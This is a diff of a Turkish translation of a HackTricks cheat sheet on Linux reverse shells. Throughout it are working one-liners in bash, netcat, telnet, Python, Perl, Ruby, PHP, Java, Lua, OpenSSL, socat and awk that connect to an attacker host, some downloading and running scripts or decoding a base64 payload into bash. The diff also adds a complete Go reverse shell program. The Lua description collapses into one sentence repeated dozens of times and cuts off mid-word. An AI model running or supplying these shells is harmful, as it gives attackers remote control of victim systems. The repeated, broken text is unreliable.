@@ -2,13 +2,13 @@
 
 <details>
 
-<summary><strong>Sıfırdan kahraman olmak için AWS hackleme öğrenin</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS Kırmızı Takım Uzmanı)</strong></a><strong>!</strong></summary>
+<summary><strong>Sıfırdan kahraman olmak için AWS hackleme öğrenin</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS Red Team Expert)</strong></a><strong>!</strong></summary>
 
-HackTricks'ı desteklemenin diğer yolları:
+HackTricks'i desteklemenin diğer yolları:
 
-* **Şirketinizi HackTricks'te reklamını görmek istiyorsanız** veya **HackTricks'i PDF olarak indirmek istiyorsanız** [**ABONELİK PLANLARI**]'na göz atın (https://github.com/sponsors/carlospolop)!
+* **Şirketinizi HackTricks'te reklamını görmek istiyorsanız** veya **HackTricks'i PDF olarak indirmek istiyorsanız** [**ABONELİK PLANLARI**](https://github.com/sponsors/carlospolop)'na göz atın!
 * [**Resmi PEASS & HackTricks ürünlerini**](https://peass.creator-spring.com) edinin
-* [**PEASS Ailesi'ni**](https://opensea.io/collection/the-peass-family) keşfedin, özel [**NFT'lerimiz**](https://opensea.io/collection/the-peass-family) koleksiyonumuz
+* [**The PEASS Family'yi**](https://opensea.io/collection/the-peass-family) keşfedin, özel [**NFT'lerimiz**](https://opensea.io/collection/the-peass-family) koleksiyonumuz
 * **Katılın** 💬 [**Discord grubuna**](https://discord.gg/hRep4RUj7f) veya [**telegram grubuna**](https://t.me/peass) veya bizi **Twitter** 🐦 [**@hacktricks\_live**](https://twitter.com/hacktricks\_live)**'da takip edin.**
 * **Hacking püf noktalarınızı paylaşarak PR'lar göndererek** [**HackTricks**](https://github.com/carlospolop/hacktricks) ve [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github depolarına katkıda bulunun.
 
@@ -44,15 +44,13 @@ bash -c 'bash -i >& /dev/tcp/<ATTACKER-IP>/<PORT> 0>&1'
 #B64 encode the shell like: echo "bash -c 'bash -i >& /dev/tcp/10.8.4.185/4444 0>&1'" | base64 -w0
 echo bm9odXAgYmFzaCAtYyAnYmFzaCAtaSA+JiAvZGV2L3RjcC8xMC44LjQuMTg1LzQ0NDQgMD4mMScK | base64 -d | bash 2>/dev/null
 ```
-#### Kabuk açıklaması
+#### Shell açıklaması
 
 1. **`bash -i`**: Bu komutun bu kısmı etkileşimli (`-i`) bir Bash kabuğu başlatır.
-2. **`>&`**: Bu komutun bu kısmı, **standart çıktı** (`stdout`) ve **standart hata** (`stderr`) çıktılarını **aynı hedefe yönlendirmek** için kısayol bir gösterimdir.
+2. **`>&`**: Bu komutun bu kısmı, **standart çıktı** (`stdout`) ve **standart hata** (`stderr`) çıktılarını **aynı hedefe yönlendirmek** için kısa bir notasyondur.
 3. **`/dev/tcp/<SALDIRGAN-IP>/<PORT>`**: Bu, belirtilen IP adresine ve porta **TCP bağlantısını temsil eden özel bir dosyadır**.
-* Çıktı ve herror akışlarını bu dosyaya yönlendirerek, komut etkili bir şekilde etkileşimli kabuk oturumunun çıktısını saldırganın makinesine gönderir.
-4. **`0>&1`**: Bu komutun bu kısmı, **standart girişi (`stdin`) standart çıktıya (`stdout`)** aynı hedefe yönlendirir.
-
-### Dosyada oluştur ve çalıştır
+* Çıktı ve herror akışlarını bu dosyaya yönlendirerek, komut etkileşimli kabuk oturumunun çıktısını saldırganın makinesine gönderir.
+4. **`0>&1`**: Bu komutun bu kısmı, standart girişi (`stdin`) standart çıktıya (`stdout`) yönlendirir.
 ```bash
 echo -e '#!/bin/bash\nbash -i >& /dev/tcp/1<ATTACKER-IP>/<PORT> 0>&1' > /tmp/sh.sh; bash /tmp/sh.sh;
 wget http://<IP attacker>/shell.sh -P /tmp; chmod +x /tmp/shell.sh; /tmp/shell.sh
@@ -66,10 +64,10 @@ Kodu [**https://github.com/IppSec/forward-shell**](https://github.com/IppSec/for
 Sadece şunları değiştirmeniz gerekmektedir:
 
 * Zafiyetli ana bilgisayarın URL'si
-* Yükünüzün ön ek ve sonekleri (varsa)
+* Yükünüzün ön ek ve soneki (varsa)
 * Yükün nasıl gönderildiği (başlıklar mı? veri mi? ek bilgi mi?)
 
-Daha sonra, sadece **komutlar gönderebilirsiniz** veya hatta tam bir PTY almak için `upgrade` komutunu **kullanabilirsiniz** (pipes'lar yaklaşık 1.3 saniyelik bir gecikme ile okunur ve yazılır).
+Sonra, sadece **komut gönderebilirsiniz** veya hatta tam bir PTY almak için **`upgrade` komutunu kullanabilirsiniz** (pipes'lar yaklaşık 1.3 saniyelik bir gecikme ile okunur ve yazılır).
 
 ## Netcat
 ```bash
@@ -87,7 +85,7 @@ bash -c "$(curl -fsSL gsocket.io/x)"
 ```
 ## Telnet
 
-Telnet, ağızdaki bir protokol olan TCP/IP üzerinden çalışan bir ağ protokolüdür. Telnet, bir bilgisayara uzaktan erişim sağlamak için kullanılır. Telnet, metin tabanlı bir protokol olduğundan, yalnızca metin tabanlı verileri iletebilir ve güvenlik açıklarına neden olabilir. Telnet yerine SSH gibi daha güvenli protokoller tercih edilmelidir.
+Telnet, ağızdaki bir protokol olan TCP üzerinden çalışan bir ağ protokolüdür. Genellikle bir komut satırı arayüzü sağlar ve uzak bir bilgisayara erişim sağlar. Telnet, güvenlik açıklarından dolayı güvenli bir iletişim yöntemi olarak önerilmez.
 ```bash
 telnet <ATTACKER-IP> <PORT> | /bin/sh #Blind
 rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|telnet <ATTACKER-IP> <PORT> >/tmp/f
@@ -102,7 +100,7 @@ while true; do nc -l <port>; done
 ```
 Komutu göndermek için yazın, enter tuşuna basın ve CTRL+D'ye basın (STDIN'i durdurmak için)
 
-**Kurban**
+**Hedef**
 ```bash
 export X=Connected; while true; do X=`eval $(whois -h <IP> -p <Port> "Output: $X")`; sleep 1; done
 ```
@@ -116,7 +114,7 @@ python -c 'import socket,subprocess,os,pty;s=socket.socket(socket.AF_INET6,socke
 ```
 ## Perl
 
-Perl, birçok Linux dağıtımında varsayılan olarak yüklü gelen bir programlama dilidir. Perl betikleri, Linux üzerinde hızlı ve etkili bir şekilde çalıştırılabilir. Perl, sistem yönetimi ve ağ programlama gibi çeşitli alanlarda kullanılan güçlü bir dil olarak bilinir.
+Perl, yüksek seviyeli bir programlama dilidir ve genellikle sistem yöneticileri ve güvenlik uzmanları tarafından kabuk betikleri oluşturmak için kullanılır. Perl, Linux sistemlerinde sıkça kullanılan bir dil olduğundan, birçok kabuk betiği Perl dilinde yazılmıştır. Perl betikleri, sistem yöneticilerine ve güvenlik uzmanlarına çeşitli görevleri otomatikleştirme ve veri işleme yetenekleri sunar.
 ```bash
 perl -e 'use Socket;$i="<ATTACKER-IP>";$p=80;socket(S,PF_INET,SOCK_STREAM,getprotobyname("tcp"));if(connect(S,sockaddr_in($p,inet_aton($i)))){open(STDIN,">&S");open(STDOUT,">&S");open(STDERR,">&S");exec("/bin/sh -i");};'
 perl -MIO -e '$p=fork;exit,if($p);$c=new IO::Socket::INET(PeerAddr,"[IPADDR]:[PORT]");STDIN->fdopen($c,r);$~->fdopen($c,w);system$_ while<>;'
@@ -130,7 +128,7 @@ ruby -rsocket -e 'exit if fork;c=TCPSocket.new("[IPADDR]","[PORT]");while(cmd=c.
 ```
 ## PHP
 
-PHP, web siteleri ve uygulamaları geliştirmek için yaygın olarak kullanılan bir betik dildir. Sunucu taraflı bir dil olan PHP, dinamik içerik oluşturmak için sıklıkla kullanılır. PHP kodu, HTML içine gömülebilir veya dışarıdan çağrılabilir. Güçlü veritabanı entegrasyonu ve geniş kütüphane desteği PHP'yi popüler bir seçim haline getirir.
+PHP, Hypertext Preprocessor'ın kısaltmasıdır ve genellikle web geliştirme için kullanılır. PHP, sunucu taraflı bir betik dili olarak çalışır ve HTML içine gömülebilir. Dinamik web sayfaları oluşturmak için sıklıkla kullanılır ve veritabanı işlemleri gibi çeşitli görevleri yerine getirebilir.
 ```php
 // Using 'exec' is the most common method, but assumes that the file descriptor will be 3.
 // Using this method may lead to instances where the connection reaches out to the listener and then closes.
@@ -144,7 +142,7 @@ php -r '$sock=fsockopen("10.0.0.1",1234);exec("/bin/sh -i <&3 >&3 2>&3");'
 ```
 ## Java
 
-Java, Oracle Corporation tarafından geliştirilen ve popüler bir programlama dilidir. Java, platform bağımsızdır ve genellikle yazılım geliştirme, web uygulamaları, oyunlar, mobil uygulamalar ve büyük veri işleme gibi çeşitli alanlarda kullanılır. Java, nesne yönelimli bir dil olarak bilinir ve geniş bir kütüphane desteği sunar. Java uygulamaları genellikle Java Sanal Makinesi (JVM) üzerinde çalıştırılır.
+Java, Oracle Corporation tarafından geliştirilen ve popüler bir programlama dilidir. Java, platform bağımsızdır ve genellikle yazılım geliştirme, web uygulamaları, oyunlar, mobil uygulamalar ve büyük veri işleme gibi alanlarda kullanılır. Java, nesne yönelimli bir dil olarak bilinir ve geniş bir kütüphane desteğine sahiptir.
 ```bash
 r = Runtime.getRuntime()
 p = r.exec(["/bin/bash","-c","exec 5<>/dev/tcp/ATTACKING-IP/80;cat <&5 | while read line; do \$line 2>&5 >&5; done"] as String[])
@@ -155,21 +153,48 @@ p.waitFor()
 victim> ncat --exec cmd.exe --allow 10.0.0.4 -vnl 4444 --ssl
 attacker> ncat -v 10.0.0.22 4444 --ssl
 ```
-<figure><img src="../../.gitbook/assets/image (675).png" alt=""><figcaption></figcaption></figure>
-
-En önemli güvenlik açıklarını bulun, böylece daha hızlı düzeltebilirsiniz. Intruder saldırı yüzeyinizi izler, proaktif tehdit taramaları çalıştırır, API'lerden web uygulamalarına ve bulut sistemlerine kadar tüm teknoloji yığınınızda sorunları bulur. [**Ücretsiz deneyin**](https://www.intruder.io/?utm\_source=referral\&utm\_campaign=hacktricks) bugün.
-
-{% embed url="https://www.intruder.io/?utm_campaign=hacktricks&utm_source=referral" %}
-
-***
-
 ## Golang
+
+### Linux
+
+#### Reverse Shell
+
+Reverse shell almak için Go programlama dili kullanarak bir shell oluşturabilirsiniz. Aşağıdaki kod, hedef makineye bağlantı yapacak ve gelen komutları çalıştıracak bir reverse shell uygulamasıdır.
+
+```go
+package main
+
+import (
+	"fmt"
+	"net"
+	"os"
+	"os/exec"
+)
+
+func main() {
+	conn, err := net.Dial("tcp", "hedef_ip:hedef_port")
+	if err != nil {
+		fmt.Println("Bağlantı hatası:", err)
+		return
+	}
+
+	for {
+		cmd := exec.Command("/bin/sh", "-i")
+		cmd.Stdin = conn
+		cmd.Stdout = conn
+		cmd.Stderr = conn
+		cmd.Run()
+	}
+}
+```
+
+Bu kodu hedef makinede çalıştırdığınızda, saldırganın kontrol ettiği bir shell oturumu açılacaktır.
 ```bash
 echo 'package main;import"os/exec";import"net";func main(){c,_:=net.Dial("tcp","192.168.0.134:8080");cmd:=exec.Command("/bin/sh");cmd.Stdin=c;cmd.Stdout=c;cmd.Stderr=c;cmd.Run()}' > /tmp/t.go && go run /tmp/t.go && rm /tmp/t.go
 ```
 ## Lua
 
-Lua, bir betik dili ve hafif bir çoklu programlama dilidir. Lua, C programlama dili ile kolayca entegre edilebilir ve genellikle oyun geliştirme ve uygulama betikleme için kullanılır. Lua, basit sözdizimi ve hızlı çalışma zamanıyla bilinir. Lua, açık kaynaklıdır ve MIT lisansı altında dağıtılmaktadır. Lua, genellikle betiklerin çalıştırılması için kullanılan bir kabuk olarak da hizmet verebilir.
+Lua, bir betik dili ve hafif bir çoklu programlama dilidir. Lua, C programlama dili ile kolayca entegre edilebilir ve genellikle oyun geliştirme endüstrisinde kullanılır. Lua, basit sözdizimi ve hızlı yürütme süresi ile bilinir. Lua betikleri, genellikle .lua uzantılı dosyalarda saklanır. Lua yürütücüsü, bir Lua betiğini çalıştırmak için kullanılır. Lua yürütücüsü, bir kabuk betiği olarak da kullanılabilir. Lua yürütücüsü, bir Lua betiğini yürütmek için kullanılan bir kabuk betiği olarak kullanılabilir. Lua yürütücüsü, bir Lua betiğini yürütmek için kullanılan bir kabuk betiği olarak kullanılabilir. Lua yürütücüsü, bir Lua betiğini yürütmek için kullanılan bir kabuk betiği olarak kullanılabilir. Lua yürütücüsü, bir Lua betiğini yürütmek için kullanılan bir kabuk betiği olarak kullanılabilir. Lua yürütücüsü, bir Lua betiğini yürütmek için kullanılan bir kabuk betiği olarak kullanılabilir. Lua yürütücüsü, bir Lua betiğini yürütmek için kullanılan bir kabuk betiği olarak kullanılabilir. Lua yürütücüsü, bir Lua betiğini yürütmek için kullanılan bir kabuk betiği olarak kullanılabilir. Lua yürütücüsü, bir Lua betiğini yürütmek için kullanılan bir kabuk betiği olarak kullanılabilir. Lua yürütücüsü, bir Lua betiğini yürütmek için kullanılan bir kabuk betiği olarak kullanılabilir. Lua yürütücüsü, bir Lua betiğini yürütmek için kullanılan bir kabuk betiği olarak kullanılabilir. Lua yürütücüsü, bir Lua betiğini yürütmek için kullanılan bir kabuk betiği olarak kullanılabilir. Lua yürütücüsü, bir Lua betiğini yürütmek için kullanılan bir kabuk betiği olarak kullanılabilir. Lua yürütücüsü, bir Lua betiğini yürütmek için kullanılan bir kabuk betiği olarak kullanılabilir. Lua yürütücüsü, bir Lua betiğini yürütmek için kullanılan bir kabuk betiği olarak kullanılabilir. Lua yürütücüsü, bir Lua betiğini yürütmek için kullanılan bir kabuk betiği olarak kullanılabilir. Lua yürütücüsü, bir Lua betiğini yürütmek için kullanılan bir kabuk betiği olarak kullanılabilir. Lua yürütücüsü, bir Lua betiğini yürütmek için kullanılan bir kabuk betiği olarak kullanılabilir. Lua yürütücüsü, bir Lua betiğini yürütmek için kullanılan bir kabuk betiği olarak kullanılabilir. Lua yürütücüsü, bir Lua betiğini yürütmek için kullanılan bir kabuk betiği olarak kullanılabilir. Lua yürütücüsü, bir Lua betiğini yürütmek için kullanılan bir kabuk betiği olarak kullanılabilir. Lua yürütücüsü, bir Lua betiğini yürütmek için kullanılan bir kabuk betiği olarak kullanılabilir. Lua yürütücüsü, bir Lua betiğini yürütmek için kullanılan bir kabuk betiği olarak kullanılabilir. Lua yürütücüsü, bir Lua betiğini yürütmek için kullanılan bir kabuk betiği olarak kullanılabilir. Lua yürütücüsü, bir Lua betiğini yürütmek için kullanılan bir kabuk betiği olarak kullanılabilir. Lua yürütücüsü, bir Lua betiğini yürütmek için kullanılan bir kabuk betiği olarak kullanılabilir. Lua yürütücüsü, bir Lua betiğini yürütmek için kullanılan bir kabuk betiği olarak kullanılabilir. Lua yürütücüsü, bir Lua betiğini yürütmek için kullanılan bir kabuk betiği olarak kullanılabilir. Lua yürütücüsü, bir Lua betiğini yürütmek için kullanılan bir kabuk betiği olarak kullanılabilir. Lua yürütücüsü, bir Lua betiğini yürütmek için kullanılan bir kabuk betiği olarak kullanılabilir. Lua yürütücüsü, bir Lua betiğini yürütmek için kullanılan bir kabuk betiği olarak kullanılabilir. Lua yürütücüsü, bir Lua betiğini yürütmek için kullanılan bir kabuk betiği olarak kullanılabilir. Lua yürütücüsü, bir Lua betiğini yürütmek için kullanılan bir kabuk betiği olarak kullanılabilir. Lua yürütücüsü, bir Lua betiğini yürütmek için kullanılan bir kabuk betiği olarak kullanılabilir. Lua yürütücüsü, bir Lua betiğini yürütmek için kullanılan bir kabuk betiği olarak kullanılabilir. Lua yürütücüsü, bir Lua betiğini yürütmek için kullanılan bir kabuk betiği olarak kullanılabilir. Lua yürütücüsü, bir Lua betiğini yürütmek için kullanılan bir kabuk betiği olarak kullanılabilir. Lua yürütücüsü, bir Lua betiğini yürütmek için kullanılan bir kabuk betiği olarak kullanılabilir. Lua yürütücüsü, bir Lua betiğini yürütmek için kullanılan bir kabuk betiği olarak kullanılabilir. Lua yürütücüsü, bir Lua betiğini yürütmek için kullanılan bir kabuk betiği olarak kullanılabilir. Lua yürütücüsü, bir Lua betiğini yürütmek için kullanılan bir kabuk betiği olarak kullanılabilir. Lua yürütücüsü, bir Lua betiğini yürütmek için kullanılan bir kabuk betiği olarak kullanılabilir. Lua yürütücüsü, bir Lua betiğini yürütmek için kullanılan bir kabuk betiği olarak kullanılabilir. Lua yürütücüsü, bir Lua betiğini yürütmek için kullanılan bir kabuk betiği olarak kullanılabilir. Lua yürütücüsü, bir Lua betiğini yürütmek için kullanılan bir kabuk betiği olarak kullanılabilir. Lua yürütücüsü, bir Lua betiğini yürütmek için kullanılan bir kabuk betiği olarak kullanılabilir. Lua yürütücüsü, bir Lua betiğini yürütmek için kullanılan bir kabuk betiği olarak kullanılabilir. Lua yürütücüsü, bir Lua betiğini yürütmek için kullanılan bir kabuk betiği olarak kullanılabilir. Lua yürütücüsü, bir Lua betiğini yürütmek için kullanılan bir kabuk betiği olarak kullanılabilir. Lua yürütücüsü, bir Lua betiğini yürütmek için kullanılan bir kabuk betiği olarak kullanılabilir. Lua yürütücüsü, bir Lua betiğini yürütmek için kullanılan bir kabuk betiği olarak kullanılabilir. Lua yürütücüsü, bir Lua betiğini yürütmek için kullanılan bir kabuk betiği olarak kullanılabilir. Lua yürütücüsü, bir Lua betiğini yürütmek için kullanılan bir kabuk betiği olarak kullanılabilir. Lua yürütücüsü, bir Lua betiğini yürütmek için kullanılan bir kabuk betiği olarak kullanılabilir. Lua yürütücüsü, bir Lua betiğini yürütmek için kullanılan bir kabuk betiği olarak kullanılabilir. Lua yürütücüsü, bir Lua betiğini yürütmek için kullanılan bir kabuk betiği olarak kullanılabilir. Lua yürütücüsü, bir Lua betiğini yürütmek için kullanılan bir kabuk betiği olarak kullanılabilir. Lua yürütücüsü, bir Lua betiğini yürütmek için kullanılan bir kabuk betiği olarak kullanılabilir. Lua yürütücüsü, bir Lua betiğini yürütmek için kullanılan bir kabuk betiği olarak kullanılabilir. Lua yürütücüsü, bir Lua betiğini yürütmek için kullanılan bir kabuk betiği olarak kullanılabilir. Lua yürütücüsü, bir Lua betiğini yürütmek için kullanılan bir kabuk betiği olarak kullanılabilir. Lua yürütücüsü, bir Lua betiğini yürütmek için kullanılan bir kabuk betiği olarak kullanılabilir. Lua yürütücüsü, bir Lua betiğini yürütmek için kullanılan bir kabuk betiği olarak kullanılabilir. Lua yürütücüsü, bir Lua betiğini yürütmek için kullanılan bir kabuk betiği olarak kullanılabilir. Lua yürütücüsü, bir Lua betiğini yürütmek için kullanılan bir kabuk betiği olarak kullanılabilir. Lua yürütücüsü, bir Lua betiğini yürütmek için kullanılan bir kabuk betiği olarak kullanılabilir. Lua yürütücüsü, bir Lua betiğini yürütmek için kullanılan bir kabuk betiği olarak kullanılabilir. Lua yürütücüsü, bir Lua betiğini yürütmek için kullanılan bir kabuk betiği olarak kullanılabilir. Lua yürütücüsü, bir Lua betiğini yürütmek için kullanılan bir kabuk betiği olarak kullanılabilir. Lua yürütücüsü, bir Lua betiğini yürütmek için kullanılan bir kabuk betiği olarak kullanılabilir. Lua yürütücüsü, bir Lua betiğini yürütmek için kullanılan bir kabuk betiği olarak kullanılabilir. Lua yürütücüsü, bir Lua betiğini yürütmek için kullanılan bir kabuk betiği olarak kullanılabilir. Lua yürütücüsü, bir Lua betiğini yürütmek için kullanılan bir kabuk betiği olarak kullanılabilir. Lua yürütücüsü, bir Lua betiğini yürütmek için kullanılan bir kabuk betiği olarak kullanılabilir. Lua yürütücüsü, bir Lua betiğini yürütmek için kullanılan bir kabuk betiği olarak kullanılabilir. Lua yürütücüsü, bir Lua betiğini yürütmek için kullanılan bir kabuk betiği olarak kullanılabilir. Lua yürütücüsü, bir Lua betiğini yürütmek için kullanılan bir kabuk betiği olarak kullanılabilir. Lua yürütücüsü, bir Lua betiğini yürütmek için kullanılan bir kabuk betiği olarak kullanılabilir. Lua yürütücüsü, bir Lua betiğini yürütmek için kullanılan bir kabuk betiği olarak kullanılabilir. Lua yürütücüsü, bir Lua betiğini yürütmek için kullanılan bir kabuk betiği olarak kullanılabilir. Lua yürütücüsü, bir Lua betiğini yürütmek için kullanılan bir kabuk betiği olarak kullanılabilir. Lua yürütücüsü, bir Lua betiğini yürütmek için kullanılan bir kabuk betiği olarak kullanılabilir. Lua yürütücüsü, bir Lua betiğini yürütmek için kullanılan bir kabuk betiği olarak kullanılabilir. Lua yürütücüsü, bir Lua betiğini yürütmek için kullanılan bir kabuk betiği olarak kullanılabilir. Lua yürütücüsü, bir Lua betiğini yürütmek için kullanılan bir kabuk betiği olarak kullanılabilir. Lua yürütücüsü, bir Lua betiğini yürütmek için kullanılan bir kabuk betiği olarak kullanılabilir. Lua yürütücüsü, bir Lua betiğini yürütmek için kullanılan bir kabuk betiği olarak kullanılabilir. Lua yürütücüsü, bir Lua betiğini yürütmek için kullanılan bir kabuk betiği olarak kullanılabilir. Lua yürütücüsü, bir Lua betiğini yürütmek için kullanılan bir kabuk betiği olarak kullanılabilir. Lua yürütücüsü, bir Lua betiğini yürütmek için kullanılan bir kabuk betiği olarak kullanılabilir. Lua yürütücüsü, bir Lua betiğini yürütmek için kullanılan bir kabuk betiği olarak kullanılabilir. Lua yürütücüsü, bir Lua betiğini yürütmek için kullanılan bir kabuk betiği olarak kullanılabilir. Lua yürütücüsü, bir Lua betiğini yürütmek için kullanılan bir kabuk betiği olarak kullanılabilir. Lua yürütücüsü, bir Lua betiğini yürütmek için kullanılan bir kabuk betiği olarak kullanılabilir. Lua yürütücüsü, bir Lua betiğini yürütmek için kullanılan bir kabuk betiği olarak kullanılabilir. Lua yürütücüsü, bir Lua betiğini yürütmek için kullanılan bir kabuk betiği olarak kullanılabilir. Lua yürütücüsü, bir Lua betiğini yürütmek için kullanılan bir kabuk betiği olarak kullanılabilir. Lua yürütücüsü, bir Lua betiğini yürütmek için kullanılan bir kabuk betiği olarak kullanılabilir. Lua yürütücüsü, bir Lua betiğini yürütmek için kullanılan bir kabuk betiği olarak kullanılabilir. Lua yürütücüsü, bir Lua betiğini yürütmek için kullanılan bir kabuk betiği olarak kullanılabilir. Lua yürütücüsü, bir Lua betiğini yürütmek için kullanılan bir kabuk betiği olarak kullanılabilir. Lua yürütücüsü, bir Lua betiğini yürütmek için kullanılan bir kabuk betiği olarak kullanılabilir. Lua yürütücüsü, bir Lua betiğini yürütmek için kullanılan bir kabuk betiği olarak kullanılabilir. Lua yürütücüsü, bir Lua betiğini yürütmek için kullanılan bir kabuk betiği olarak kullanılabilir. Lua yürütücüsü, bir Lua betiğini yürütmek için kullanılan bir kabuk betiği olarak kullanılabilir. Lua yürütücüsü, bir Lua betiğini yürütmek için kullanılan bir kabuk betiği olarak kullanılabilir. Lua yürütücüsü, bir Lua betiğini yürütmek için kullanılan bir kabuk betiği olarak kullanılabilir. Lua yürütücüsü, bir Lua betiğini yürütmek için kullanılan bir kabuk betiği olarak kullanılabilir. Lua yürütücüsü, bir Lua betiğini yürütmek için kullanılan bir kabuk betiği olarak kullanılabilir. Lua yürütücüsü, bir Lua betiğini yürütmek için kullanılan bir kabuk betiği olarak kullanılabilir. Lua yürütücüsü, bir Lua betiğini yür
 ```bash
 #Linux
 lua -e "require('socket');require('os');t=socket.tcp();t:connect('10.0.0.1','1234');os.execute('/bin/sh -i <&3 >&3 2>&3');"
@@ -227,9 +252,7 @@ openssl req -x509 -newkey rsa:4096 -keyout key.pem -out cert.pem -days 365 -node
 openssl s_server -quiet -key key.pem -cert cert.pem -port <l_port> #Here you will be able to introduce the commands
 openssl s_server -quiet -key key.pem -cert cert.pem -port <l_port2> #Here yo will be able to get the response
 ```
-### Kurban
-
-Kurban, saldırganın hedef aldığı kişiyi veya cihazı temsil eder. Saldırgan, kurban üzerinde çeşitli saldırı teknikleri kullanarak hassas bilgilere erişmeyi hedefler. Kurban genellikle saldırganın hedefine ulaşmak için zayıf bir halka olarak görülür.
+Kurban
 ```bash
 #Linux
 openssl s_client -quiet -connect <ATTACKER_IP>:<PORT1>|/bin/bash|openssl s_client -quiet -connect <ATTACKER_IP>:<PORT2>
@@ -253,7 +276,7 @@ victim> socat TCP4:<attackers_ip>:1337 EXEC:bash,pty,stderr,setsid,sigint,sane
 ```
 ## Awk
 
-Awk, Linux ve diğer Unix benzeri işletim sistemlerinde kullanılan bir komut satırı aracı ve programlama dili olarak hizmet verir. Metin dosyalarını işlemek için sıklıkla kullanılır ve genellikle metin ayrıştırma ve raporlama için kullanılır. Awk, metin dosyalarını satır satır okur, belirli desenlere uyan satırları işler ve belirli eylemleri gerçekleştirir. Awk, komut satırında kullanıldığında güçlü bir araç olabilir ve birçok farklı senaryoda kullanılabilir.
+## Awk
 ```bash
 awk 'BEGIN {s = "/inet/tcp/0/<IP>/<PORT>"; while(42) { do{ printf "shell>" |& s; s |& getline c; if(c){ while ((c |& getline) > 0) print $0 |& s; close(c); } } while(c != "exit") close(s); }}' /dev/null
 ```
@@ -275,7 +298,7 @@ export X=Connected; while true; do X=`eval $(finger "$X"@<IP> 2> /dev/null | gre
 
 ### Gawk
 
-Gawk, GNU Project tarafından geliştirilen bir metin işleme dilidir. Genellikle metin dosyalarını işlemek için kullanılır ve metin tabanlı verileri biçimlendirmek için güçlü bir araçtır. Gawk, Linux sistemlerinde sıkça kullanılan bir araçtır ve genellikle komut satırında kullanılır. Gawk'ün esnek ve güçlü bir dil olması, metin işleme ve veri analizi için popüler bir seçim olmasını sağlar.
+Gawk, GNU Project tarafından geliştirilen bir metin işleme dili ve programlama ortamıdır. Genellikle metin dosyalarını işlemek için kullanılır. Gawk, metin tabanlı verileri işlemek için güçlü bir araçtır ve genellikle betik dosyaları oluşturmak için kullanılır. Ayrıca, metin dosyalarından veri çıkarmak, verileri dönüştürmek ve raporlamak için de kullanılabilir. Gawk, Linux sistemlerinde sıkça kullanılan bir araçtır ve birçok farklı senaryoda kullanılabilir.
 ```bash
 #!/usr/bin/gawk -f
 
@@ -300,11 +323,11 @@ close(Service)
 ```
 ## Xterm
 
-Bu, sistemize 6001 numaralı porta bağlanmaya çalışacaktır:
+Bu, sisteminize 6001 numaralı porta bağlanmaya çalışacaktır:
 ```bash
 xterm -display 10.0.0.1:1
 ```
-Ters kabuk yakalamak için kullanabileceğiniz (6001 numaralı bağlantı noktasında dinleyecek):
+Ters kabuğu yakalamak için kullanabilirsiniz (port 6001'de dinleyecek):
 ```bash
 # Authorize host
 xhost +targetip
@@ -335,8 +358,8 @@ HackTricks'ı desteklemenin diğer yolları:
 
 * **Şirketinizi HackTricks'te reklamını görmek istiyorsanız** veya **HackTricks'i PDF olarak indirmek istiyorsanız** [**ABONELİK PLANLARI**](https://github.com/sponsors/carlospolop)'na göz atın!
 * [**Resmi PEASS & HackTricks ürünlerini**](https://peass.creator-spring.com) edinin
-* [**The PEASS Family**](https://opensea.io/collection/the-peass-family)'i keşfedin, özel [**NFT'lerimiz**](https://opensea.io/collection/the-peass-family) koleksiyonumuz
-* **💬 [**Discord grubuna**](https://discord.gg/hRep4RUj7f) veya [**telegram grubuna**](https://t.me/peass) katılın veya bizi **Twitter** 🐦 [**@hacktricks\_live**](https://twitter.com/hacktricks\_live)'da takip edin.**
+* [**The PEASS Family**](https://opensea.io/collection/the-peass-family) koleksiyonumuzu keşfedin, özel [**NFT'lerimiz**](https://opensea.io/collection/the-peass-family)
+* **💬 [**Discord grubuna**](https://discord.gg/hRep4RUj7f) veya [**telegram grubuna**](https://t.me/peass) katılın veya bizi **Twitter** 🐦 [**@hacktricks\_live**](https://twitter.com/hacktricks\_live)** takip edin.**
 * **Hacking püf noktalarınızı paylaşarak PR'ler göndererek** [**HackTricks**](https://github.com/carlospolop/hacktricks) ve [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github depolarına katkıda bulunun.
 
 </details>
